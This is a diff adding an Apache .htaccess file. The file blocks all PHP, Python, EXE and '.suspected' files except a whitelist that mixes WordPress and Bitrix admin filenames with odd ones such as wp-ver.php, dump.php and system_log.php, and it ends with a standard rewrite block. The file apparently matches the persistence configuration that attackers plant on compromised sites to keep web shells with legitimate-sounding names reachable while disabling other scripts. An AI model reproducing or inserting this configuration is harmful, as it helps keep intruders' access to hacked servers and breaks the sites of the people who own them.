@@ -1,0 +1,16 @@
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(index.php|plugins.php|adminfuns.php|1c_admin.php|cjfuns.php|1c_exchange.php|1c_import.php|abtest_admin.php|abtest_ajax.php|abtest_edit.php|abtest_report.php|admin_notify.php|agent_edit.php|agent_list.php|agreement_admin.php|alfabank_orders.php|all_settings_index.php|api_search_index.php|captcha.php|posting_admin.php|posting_attachment.php|posting_bcc.php|posting_edit.php|posting_search.php|urlrewrite.php|auth.php|.personal.menu.php|.section.php|template_edit.php|template_admin.php|b24connector_b24connector.php|checklist.php|composite.php|culture_admin.php|header.php|currencies.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-comments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.php|dump.php|ms-sites.php|options-writing.php|themes.php|admin-ajax.php|edit-form-comment.php|link.php|ms-themes.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scripts.php|ms-upgrade-network.php|fileman_doc_roots.php|edit.php|load-styles.php|ms-users.php|plugins.php|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-tags.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|press-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|user-edit.php|fileman_admin.php|options-general.php|profile.php|user-new.php|moderation.php|options-head.php|revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|widgets.php|custom-header.php|ms-delete-site.php|wp-ver.php|term.php|footer.php|link-add.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|fileman_file_upload.php|system_log.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
